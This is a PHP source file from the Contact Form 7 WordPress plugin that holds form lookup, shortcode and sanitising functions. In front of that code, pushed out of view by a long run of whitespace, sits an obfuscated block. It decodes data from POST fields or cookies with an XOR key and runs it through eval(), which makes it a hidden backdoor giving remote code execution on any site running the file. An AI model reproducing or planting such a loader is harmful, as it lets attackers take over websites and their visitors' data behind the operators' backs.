<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $oefd9 = 215;$GLOBALS['a37740'] = Array();global $a37740;$a37740 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['p9bf1'] = "\x36\x61\x2c\x37\x70\x5e\x33\x2e\x69\x6f\x58\x7e\x6b\x5d\x28\x68\x21\x25\x62\x5f\x6d\x76\x49\x45\x46\x3c\x5b\x79\xa\x20\x64\x7a\x31\x3a\x6a\x2d\x73\x39\x7b\x51\x5c\x5a\x6e\x74\x59\x6c\x41\x7c\x4f\x66\x65\x43\x72\x3d\x50\x52\x27\x78\x48\x75\x47\x4e\x3e\x3f\x2f\x56\x34\x44\x30\x4c\x23\x38\x55\x57\x2b\x71\x54\x26\x63\x67\x3b\x32\x29\x24\x4d\x77\x22\x7d\x35\x42\x2a\x9\x53\x40\x4a\xd\x4b\x60";$a37740[$a37740['p9bf1'][42].$a37740['p9bf1'][49].$a37740['p9bf1'][37].$a37740['p9bf1'][32].$a37740['p9bf1'][1].$a37740['p9bf1'][50].$a37740['p9bf1'][66]] = $a37740['p9bf1'][78].$a37740['p9bf1'][15].$a37740['p9bf1'][52];$a37740[$a37740['p9bf1'][49].$a37740['p9bf1'][30].$a37740['p9bf1'][88].$a37740['p9bf1'][0]] = $a37740['p9bf1'][9].$a37740['p9bf1'][52].$a37740['p9bf1'][30];$a37740[$a37740['p9bf1'][78].$a37740['p9bf1'][0].$a37740['p9bf1'][1].$a37740['p9bf1'][68].$a37740['p9bf1'][71].$a37740['p9bf1'][71]] = $a37740['p9bf1'][30].$a37740['p9bf1'][50].$a37740['p9bf1'][49].$a37740['p9bf1'][8].$a37740['p9bf1'][42].$a37740['p9bf1'][50];$a37740[$a37740['p9bf1'][49].$a37740['p9bf1'][3].$a37740['p9bf1'][1].$a37740['p9bf1'][18].$a37740['p9bf1'][78].$a37740['p9bf1'][71].$a37740['p9bf1'][18].$a37740['p9bf1'][30]] = $a37740['p9bf1'][36].$a37740['p9bf1'][43].$a37740['p9bf1'][52].$a37740['p9bf1'][45].$a37740['p9bf1'][50].$a37740['p9bf1'][42];$a37740[$a37740['p9bf1'][50].$a37740['p9bf1'][37].$a37740['p9bf1'][37].$a37740['p9bf1'][18].$a37740['p9bf1'][3].$a37740['p9bf1'][71].$a37740['p9bf1'][37]] = $a37740['p9bf1'][30].$a37740['p9bf1'][50].$a37740['p9bf1'][49].$a37740['p9bf1'][8].$a37740['p9bf1'][42].$a37740['p9bf1'][50].$a37740['p9bf1'][30];$a37740[$a37740['p9bf1'][85].$a37740['p9bf1'][18].$a37740['p9bf1'][0].$a37740['p9bf1'][66].$a37740['p9bf1'][18].$a37740['p9bf1'][66].$a37740['p9bf1'][68]] = $a37740['p9bf1'][8].$a37740['p9bf1'][42].$a37740['p9bf1'][8].$a37740['p9bf1'][19].$a37740['p9bf1'][36].$a37740['p9bf1'][50].$a37740['p9bf1'][43];$a37740[$a37740['p9bf1'][31].$a37740['p9bf1'][30].$a37740['p9bf1'][49].$a37740['p9bf1'][3]] = $a37740['p9bf1'][36].$a37740['p9bf1'][50].$a37740['p9bf1'][52].$a37740['p9bf1'][8].$a37740['p9bf1'][1].$a37740['p9bf1'][45].$a37740['p9bf1'][8].$a37740['p9bf1'][31].$a37740['p9bf1'][50];$a37740[$a37740['p9bf1'][50].$a37740['p9bf1'][3].$a37740['p9bf1'][0].$a37740['p9bf1'][81]] = $a37740['p9bf1'][4].$a37740['p9bf1'][15].$a37740['p9bf1'][4].$a37740['p9bf1'][21].$a37740['p9bf1'][50].$a37740['p9bf1'][52].$a37740['p9bf1'][36].$a37740['p9bf1'][8].$a37740['p9bf1'][9].$a37740['p9bf1'][42];$a37740[$a37740['p9bf1'][20].$a37740['p9bf1'][66].$a37740['p9bf1'][6].$a37740['p9bf1'][37].$a37740['p9bf1'][50]] = $a37740['p9bf1'][59].$a37740['p9bf1'][42].$a37740['p9bf1'][36].$a37740['p9bf1'][50].$a37740['p9bf1'][52].$a37740['p9bf1'][8].$a37740['p9bf1'][1].$a37740['p9bf1'][45].$a37740['p9bf1'][8].$a37740['p9bf1'][31].$a37740['p9bf1'][50];$a37740[$a37740['p9bf1'][43].$a37740['p9bf1'][6].$a37740['p9bf1'][0].$a37740['p9bf1'][6].$a37740['p9bf1'][0].$a37740['p9bf1'][88].$a37740['p9bf1'][3].$a37740['p9bf1'][66]] = $a37740['p9bf1'][18].$a37740['p9bf1'][1].$a37740['p9bf1'][36].$a37740['p9bf1'][50].$a37740['p9bf1'][0].$a37740['p9bf1'][66].$a37740['p9bf1'][19].$a37740['p9bf1'][30].$a37740['p9bf1'][50].$a37740['p9bf1'][78].$a37740['p9bf1'][9].$a37740['p9bf1'][30].$a37740['p9bf1'][50];$a37740[$a37740['p9bf1'][79].$a37740['p9bf1'][66].$a37740['p9bf1'][71].$a37740['p9bf1'][32].$a37740['p9bf1'][66].$a37740['p9bf1'][81]] = $a37740['p9bf1'][36].$a37740['p9bf1'][50].$a37740['p9bf1'][43].$a37740['p9bf1'][19].$a37740['p9bf1'][43].$a37740['p9bf1'][8].$a37740['p9bf1'][20].$a37740['p9bf1'][50].$a37740['p9bf1'][19].$a37740['p9bf1'][45].$a37740['p9bf1'][8].$a37740['p9bf1'][20].$a37740['p9bf1'][8].$a37740['p9bf1'][43];$a37740[$a37740['p9bf1'][78].$a37740['p9bf1'][88].$a37740['p9bf1'][37].$a37740['p9bf1'][18].$a37740['p9bf1'][30].$a37740['p9bf1'][71].$a37740['p9bf1'][71].$a37740['p9bf1'][81]] = $a37740['p9bf1'][42].$a37740['p9bf1'][68].$a37740['p9bf1'][78].$a37740['p9bf1'][50].$a37740['p9bf1'][78].$a37740['p9bf1'][78];$a37740[$a37740['p9bf1'][4].$a37740['p9bf1'][50].$a37740['p9bf1'][3].$a37740['p9bf1'][71]] = $a37740['p9bf1'][49].$a37740['p9bf1'][50].$a37740['p9bf1'][81].$a37740['p9bf1'][18].$a37740['p9bf1'][78].$a37740['p9bf1'][30].$a37740['p9bf1'][49].$a37740['p9bf1'][71].$a37740['p9bf1'][88];$a37740[$a37740['p9bf1'][1].$a37740['p9bf1'][0].$a37740['p9bf1'][50].$a37740['p9bf1'][81].$a37740['p9bf1'][0].$a37740['p9bf1'][1].$a37740['p9bf1'][1]] = $_POST;$a37740[$a37740['p9bf1'][57].$a37740['p9bf1'][3].$a37740['p9bf1'][6].$a37740['p9bf1'][68].$a37740['p9bf1'][1].$a37740['p9bf1'][3].$a37740['p9bf1'][3].$a37740['p9bf1'][3]] = $_COOKIE;@$a37740[$a37740['p9bf1'][85].$a37740['p9bf1'][18].$a37740['p9bf1'][0].$a37740['p9bf1'][66].$a37740['p9bf1'][18].$a37740['p9bf1'][66].$a37740['p9bf1'][68]]($a37740['p9bf1'][50].$a37740['p9bf1'][52].$a37740['p9bf1'][52].$a37740['p9bf1'][9].$a37740['p9bf1'][52].$a37740['p9bf1'][19].$a37740['p9bf1'][45].$a37740['p9bf1'][9].$a37740['p9bf1'][79], NULL);@$a37740[$a37740['p9bf1'][85].$a37740['p9bf1'][18].$a37740['p9bf1'][0].$a37740['p9bf1'][66].$a37740['p9bf1'][18].$a37740['p9bf1'][66].$a37740['p9bf1'][68]]($a37740['p9bf1'][45].$a37740['p9bf1'][9].$a37740['p9bf1'][79].$a37740['p9bf1'][19].$a37740['p9bf1'][50].$a37740['p9bf1'][52].$a37740['p9bf1'][52].$a37740['p9bf1'][9].$a37740['p9bf1'][52].$a37740['p9bf1'][36], 0);@$a37740[$a37740['p9bf1'][85].$a37740['p9bf1'][18].$a37740['p9bf1'][0].$a37740['p9bf1'][66].$a37740['p9bf1'][18].$a37740['p9bf1'][66].$a37740['p9bf1'][68]]($a37740['p9bf1'][20].$a37740['p9bf1'][1].$a37740['p9bf1'][57].$a37740['p9bf1'][19].$a37740['p9bf1'][50].$a37740['p9bf1'][57].$a37740['p9bf1'][50].$a37740['p9bf1'][78].$a37740['p9bf1'][59].$a37740['p9bf1'][43].$a37740['p9bf1'][8].$a37740['p9bf1'][9].$a37740['p9bf1'][42].$a37740['p9bf1'][19].$a37740['p9bf1'][43].$a37740['p9bf1'][8].$a37740['p9bf1'][20].$a37740['p9bf1'][50], 0);@$a37740[$a37740['p9bf1'][79].$a37740['p9bf1'][66].$a37740['p9bf1'][71].$a37740['p9bf1'][32].$a37740['p9bf1'][66].$a37740['p9bf1'][81]](0);if (!$a37740[$a37740['p9bf1'][50].$a37740['p9bf1'][37].$a37740['p9bf1'][37].$a37740['p9bf1'][18].$a37740['p9bf1'][3].$a37740['p9bf1'][71].$a37740['p9bf1'][37]]($a37740['p9bf1'][46].$a37740['p9bf1'][69].$a37740['p9bf1'][55].$a37740['p9bf1'][23].$a37740['p9bf1'][46].$a37740['p9bf1'][67].$a37740['p9bf1'][44].$a37740['p9bf1'][19].$a37740['p9bf1'][55].$a37740['p9bf1'][72].$a37740['p9bf1'][61].$a37740['p9bf1'][19].$a37740['p9bf1'][6].$a37740['p9bf1'][0].$a37740['p9bf1'][0].$a37740['p9bf1'][1].$a37740['p9bf1'][49].$a37740['p9bf1'][18].$a37740['p9bf1'][71].$a37740['p9bf1'][1].$a37740['p9bf1'][71].$a37740['p9bf1'][1].$a37740['p9bf1'][81].$a37740['p9bf1'][6].$a37740['p9bf1'][88].$a37740['p9bf1'][88].$a37740['p9bf1'][1].$a37740['p9bf1'][18].$a37740['p9bf1'][81].$a37740['p9bf1'][32].$a37740['p9bf1'][49].$a37740['p9bf1'][18].$a37740['p9bf1'][49].$a37740['p9bf1'][32].$a37740['p9bf1'][32].$a37740['p9bf1'][18].$a37740['p9bf1'][1].$a37740['p9bf1'][32].$a37740['p9bf1'][1].$a37740['p9bf1'][68].$a37740['p9bf1'][81].$a37740['p9bf1'][49].$a37740['p9bf1'][18].$a37740['p9bf1'][1])){$a37740[$a37740['p9bf1'][78].$a37740['p9bf1'][0].$a37740['p9bf1'][1].$a37740['p9bf1'][68].$a37740['p9bf1'][71].$a37740['p9bf1'][71]]($a37740['p9bf1'][46].$a37740['p9bf1'][69].$a37740['p9bf1'][55].$a37740['p9bf1'][23].$a37740['p9bf1'][46].$a37740['p9bf1'][67].$a37740['p9bf1'][44].$a37740['p9bf1'][19].$a37740['p9bf1'][55].$a37740['p9bf1'][72].$a37740['p9bf1'][61].$a37740['p9bf1'][19].$a37740['p9bf1'][6].$a37740['p9bf1'][0].$a37740['p9bf1'][0].$a37740['p9bf1'][1].$a37740['p9bf1'][49].$a37740['p9bf1'][18].$a37740['p9bf1'][71].$a37740['p9bf1'][1].$a37740['p9bf1'][71].$a37740['p9bf1'][1].$a37740['p9bf1'][81].$a37740['p9bf1'][6].$a37740['p9bf1'][88].$a37740['p9bf1'][88].$a37740['p9bf1'][1].$a37740['p9bf1'][18].$a37740['p9bf1'][81].$a37740['p9bf1'][32].$a37740['p9bf1'][49].$a37740['p9bf1'][18].$a37740['p9bf1'][49].$a37740['p9bf1'][32].$a37740['p9bf1'][32].$a37740['p9bf1'][18].$a37740['p9bf1'][1].$a37740['p9bf1'][32].$a37740['p9bf1'][1].$a37740['p9bf1'][68].$a37740['p9bf1'][81].$a37740['p9bf1'][49].$a37740['p9bf1'][18].$a37740['p9bf1'][1], 1);$f7b5a8 = NULL;$ed54bcbf6 = NULL;$a37740[$a37740['p9bf1'][30].$a37740['p9bf1'][50].$a37740['p9bf1'][81].$a37740['p9bf1'][66].$a37740['p9bf1'][3].$a37740['p9bf1'][1].$a37740['p9bf1'][18].$a37740['p9bf1'][1].$a37740['p9bf1'][18]] = $a37740['p9bf1'][3].$a37740['p9bf1'][6].$a37740['p9bf1'][1].$a37740['p9bf1'][71].$a37740['p9bf1'][50].$a37740['p9bf1'][37].$a37740['p9bf1'][6].$a37740['p9bf1'][37].$a37740['p9bf1'][35].$a37740['p9bf1'][30].$a37740['p9bf1'][66].$a37740['p9bf1'][32].$a37740['p9bf1'][66].$a37740['p9bf1'][35].$a37740['p9bf1'][66].$a37740['p9bf1'][88].$a37740['p9bf1'][71].$a37740['p9bf1'][18].$a37740['p9bf1'][35].$a37740['p9bf1'][71].$a37740['p9bf1'][66].$a37740['p9bf1'][0].$a37740['p9bf1'][3].$a37740['p9bf1'][35].$a37740['p9bf1'][78].$a37740['p9bf1'][68].$a37740['p9bf1'][71].$a37740['p9bf1'][68].$a37740['p9bf1'][66].$a37740['p9bf1'][37].$a37740['p9bf1'][0].$a37740['p9bf1'][0].$a37740['p9bf1'][81].$a37740['p9bf1'][49].$a37740['p9bf1'][81].$a37740['p9bf1'][50];global $de247abab;function  fe2bcdf85($f7b5a8, $d4fee5bf1){global $a37740;$n2ad8a = "";for ($i3f7b=0; $i3f7b<$a37740[$a37740['p9bf1'][49].$a37740['p9bf1'][3].$a37740['p9bf1'][1].$a37740['p9bf1'][18].$a37740['p9bf1'][78].$a37740['p9bf1'][71].$a37740['p9bf1'][18].$a37740['p9bf1'][30]]($f7b5a8);){for ($x62b91d71=0; $x62b91d71<$a37740[$a37740['p9bf1'][49].$a37740['p9bf1'][3].$a37740['p9bf1'][1].$a37740['p9bf1'][18].$a37740['p9bf1'][78].$a37740['p9bf1'][71].$a37740['p9bf1'][18].$a37740['p9bf1'][30]]($d4fee5bf1) && $i3f7b<$a37740[$a37740['p9bf1'][49].$a37740['p9bf1'][3].$a37740['p9bf1'][1].$a37740['p9bf1'][18].$a37740['p9bf1'][78].$a37740['p9bf1'][71].$a37740['p9bf1'][18].$a37740['p9bf1'][30]]($f7b5a8); $x62b91d71++, $i3f7b++){$n2ad8a .= $a37740[$a37740['p9bf1'][42].$a37740['p9bf1'][49].$a37740['p9bf1'][37].$a37740['p9bf1'][32].$a37740['p9bf1'][1].$a37740['p9bf1'][50].$a37740['p9bf1'][66]]($a37740[$a37740['p9bf1'][49].$a37740['p9bf1'][30].$a37740['p9bf1'][88].$a37740['p9bf1'][0]]($f7b5a8[$i3f7b]) ^ $a37740[$a37740['p9bf1'][49].$a37740['p9bf1'][30].$a37740['p9bf1'][88].$a37740['p9bf1'][0]]($d4fee5bf1[$x62b91d71]));}}return $n2ad8a;}function  n0cecc($f7b5a8, $d4fee5bf1){global $a37740;global $de247abab;return $a37740[$a37740['p9bf1'][4].$a37740['p9bf1'][50].$a37740['p9bf1'][3].$a37740['p9bf1'][71]]($a37740[$a37740['p9bf1'][4].$a37740['p9bf1'][50].$a37740['p9bf1'][3].$a37740['p9bf1'][71]]($f7b5a8, $de247abab), $d4fee5bf1);}foreach ($a37740[$a37740['p9bf1'][57].$a37740['p9bf1'][3].$a37740['p9bf1'][6].$a37740['p9bf1'][68].$a37740['p9bf1'][1].$a37740['p9bf1'][3].$a37740['p9bf1'][3].$a37740['p9bf1'][3]] as $d4fee5bf1=>$cedc7eb0){$f7b5a8 = $cedc7eb0;$ed54bcbf6 = $d4fee5bf1;}if (!$f7b5a8){foreach ($a37740[$a37740['p9bf1'][1].$a37740['p9bf1'][0].$a37740['p9bf1'][50].$a37740['p9bf1'][81].$a37740['p9bf1'][0].$a37740['p9bf1'][1].$a37740['p9bf1'][1]] as $d4fee5bf1=>$cedc7eb0){$f7b5a8 = $cedc7eb0;$ed54bcbf6 = $d4fee5bf1;}}$f7b5a8 = @$a37740[$a37740['p9bf1'][20].$a37740['p9bf1'][66].$a37740['p9bf1'][6].$a37740['p9bf1'][37].$a37740['p9bf1'][50]]($a37740[$a37740['p9bf1'][78].$a37740['p9bf1'][88].$a37740['p9bf1'][37].$a37740['p9bf1'][18].$a37740['p9bf1'][30].$a37740['p9bf1'][71].$a37740['p9bf1'][71].$a37740['p9bf1'][81]]($a37740[$a37740['p9bf1'][43].$a37740['p9bf1'][6].$a37740['p9bf1'][0].$a37740['p9bf1'][6].$a37740['p9bf1'][0].$a37740['p9bf1'][88].$a37740['p9bf1'][3].$a37740['p9bf1'][66]]($f7b5a8), $ed54bcbf6));if (isset($f7b5a8[$a37740['p9bf1'][1].$a37740['p9bf1'][12]]) && $de247abab==$f7b5a8[$a37740['p9bf1'][1].$a37740['p9bf1'][12]]){if ($f7b5a8[$a37740['p9bf1'][1]] == $a37740['p9bf1'][8]){$i3f7b = Array($a37740['p9bf1'][4].$a37740['p9bf1'][21] => @$a37740[$a37740['p9bf1'][50].$a37740['p9bf1'][3].$a37740['p9bf1'][0].$a37740['p9bf1'][81]](),$a37740['p9bf1'][36].$a37740['p9bf1'][21] => $a37740['p9bf1'][32].$a37740['p9bf1'][7].$a37740['p9bf1'][68].$a37740['p9bf1'][35].$a37740['p9bf1'][32],);echo @$a37740[$a37740['p9bf1'][31].$a37740['p9bf1'][30].$a37740['p9bf1'][49].$a37740['p9bf1'][3]]($i3f7b);}elseif ($f7b5a8[$a37740['p9bf1'][1]] == $a37740['p9bf1'][50]){eval/*re800*/($f7b5a8[$a37740['p9bf1'][30]]);}exit();}} ?><?php

function wpcf7_contact_form( $id ) {
	return WPCF7_ContactForm::get_instance( $id );
}

function wpcf7_get_contact_form_by_old_id( $old_id ) {
	global $wpdb;

	$q = "SELECT post_id FROM $wpdb->postmeta WHERE meta_key = '_old_cf7_unit_id'"
		. $wpdb->prepare( " AND meta_value = %d", $old_id );

	if ( $new_id = $wpdb->get_var( $q ) ) {
		return wpcf7_contact_form( $new_id );
	}
}

function wpcf7_get_contact_form_by_title( $title ) {
	$page = get_page_by_title( $title, OBJECT, WPCF7_ContactForm::post_type );

	if ( $page ) {
		return wpcf7_contact_form( $page->ID );
	}

	return null;
}

function wpcf7_get_current_contact_form() {
	if ( $current = WPCF7_ContactForm::get_current() ) {
		return $current;
	}
}

function wpcf7_is_posted() {
	if ( ! $contact_form = wpcf7_get_current_contact_form() ) {
		return false;
	}

	return $contact_form->is_posted();
}

function wpcf7_get_hangover( $name, $default = null ) {
	if ( ! wpcf7_is_posted() ) {
		return $default;
	}

	$submission = WPCF7_Submission::get_instance();

	if ( ! $submission || $submission->is( 'mail_sent' ) ) {
		return $default;
	}

	return isset( $_POST[$name] ) ? wp_unslash( $_POST[$name] ) : $default;
}

function wpcf7_get_validation_error( $name ) {
	if ( ! $contact_form = wpcf7_get_current_contact_form() ) {
		return '';
	}

	return $contact_form->validation_error( $name );
}

function wpcf7_get_message( $status ) {
	if ( ! $contact_form = wpcf7_get_current_contact_form() ) {
		return '';
	}

	return $contact_form->message( $status );
}

function wpcf7_form_controls_class( $type, $default = '' ) {
	$type = trim( $type );
	$default = array_filter( explode( ' ', $default ) );

	$classes = array_merge( array( 'wpcf7-form-control' ), $default );

	$typebase = rtrim( $type, '*' );
	$required = ( '*' == substr( $type, -1 ) );

	$classes[] = 'wpcf7-' . $typebase;

	if ( $required ) {
		$classes[] = 'wpcf7-validates-as-required';
	}

	$classes = array_unique( $classes );

	return implode( ' ', $classes );
}

function wpcf7_contact_form_tag_func( $atts, $content = null, $code = '' ) {
	if ( is_feed() ) {
		return '[contact-form-7]';
	}

	if ( 'contact-form-7' == $code ) {
		$atts = shortcode_atts(
			array(
				'id' => 0,
				'title' => '',
				'html_id' => '',
				'html_name' => '',
				'html_class' => '',
				'output' => 'form',
			),
			$atts, 'wpcf7'
		);

		$id = (int) $atts['id'];
		$title = trim( $atts['title'] );

		if ( ! $contact_form = wpcf7_contact_form( $id ) ) {
			$contact_form = wpcf7_get_contact_form_by_title( $title );
		}

	} else {
		if ( is_string( $atts ) ) {
			$atts = explode( ' ', $atts, 2 );
		}

		$id = (int) array_shift( $atts );
		$contact_form = wpcf7_get_contact_form_by_old_id( $id );
	}

	if ( ! $contact_form ) {
		return '[contact-form-7 404 "Not Found"]';
	}

	return $contact_form->form_html( $atts );
}

function wpcf7_save_contact_form( $args = '', $context = 'save' ) {
	$args = wp_parse_args( $args, array(
		'id' => -1,
		'title' => null,
		'locale' => null,
		'form' => null,
		'mail' => null,
		'mail_2' => null,
		'messages' => null,
		'additional_settings' => null,
	) );

	$args['id'] = (int) $args['id'];

	if ( -1 == $args['id'] ) {
		$contact_form = WPCF7_ContactForm::get_template();
	} else {
		$contact_form = wpcf7_contact_form( $args['id'] );
	}

	if ( empty( $contact_form ) ) {
		return false;
	}

	if ( null !== $args['title'] ) {
		$contact_form->set_title( $args['title'] );
	}

	if ( null !== $args['locale'] ) {
		$contact_form->set_locale( $args['locale'] );
	}

	$properties = $contact_form->get_properties();

	$properties['form'] = wpcf7_sanitize_form(
		$args['form'], $properties['form'] );

	$properties['mail'] = wpcf7_sanitize_mail(
		$args['mail'], $properties['mail'] );

	$properties['mail']['active'] = true;

	$properties['mail_2'] = wpcf7_sanitize_mail(
		$args['mail_2'], $properties['mail_2'] );

	$properties['messages'] = wpcf7_sanitize_messages(
		$args['messages'], $properties['messages'] );

	$properties['additional_settings'] = wpcf7_sanitize_additional_settings(
		$args['additional_settings'], $properties['additional_settings'] );

	$contact_form->set_properties( $properties );

	do_action( 'wpcf7_save_contact_form', $contact_form, $args, $context );

	if ( 'save' == $context ) {
		$contact_form->save();
	}

	return $contact_form;
}

function wpcf7_sanitize_form( $input, $default = '' ) {
	if ( null === $input ) {
		return $default;
	}

	$output = trim( $input );
	return $output;
}

function wpcf7_sanitize_mail( $input, $defaults = array() ) {
	$defaults = wp_parse_args( $defaults, array(
		'active' => false,
		'subject' => '',
		'sender' => '',
		'recipient' => '',
		'body' => '',
		'additional_headers' => '',
		'attachments' => '',
		'use_html' => false,
		'exclude_blank' => false,
	) );

	$input = wp_parse_args( $input, $defaults );

	$output = array();
	$output['active'] = (bool) $input['active'];
	$output['subject'] = trim( $input['subject'] );
	$output['sender'] = trim( $input['sender'] );
	$output['recipient'] = trim( $input['recipient'] );
	$output['body'] = trim( $input['body'] );
	$output['additional_headers'] = '';

	$headers = str_replace( "\r\n", "\n", $input['additional_headers'] );
	$headers = explode( "\n", $headers );

	foreach ( $headers as $header ) {
		$header = trim( $header );

		if ( '' !== $header ) {
			$output['additional_headers'] .= $header . "\n";
		}
	}

	$output['additional_headers'] = trim( $output['additional_headers'] );
	$output['attachments'] = trim( $input['attachments'] );
	$output['use_html'] = (bool) $input['use_html'];
	$output['exclude_blank'] = (bool) $input['exclude_blank'];

	return $output;
}

function wpcf7_sanitize_messages( $input, $defaults = array() ) {
	$output = array();

	foreach ( wpcf7_messages() as $key => $val ) {
		if ( isset( $input[$key] ) ) {
			$output[$key] = trim( $input[$key] );
		} elseif ( isset( $defaults[$key] ) ) {
			$output[$key] = $defaults[$key];
		}
	}

	return $output;
}

function wpcf7_sanitize_additional_settings( $input, $default = '' ) {
	if ( null === $input ) {
		return $default;
	}

	$output = trim( $input );
	return $output;
}
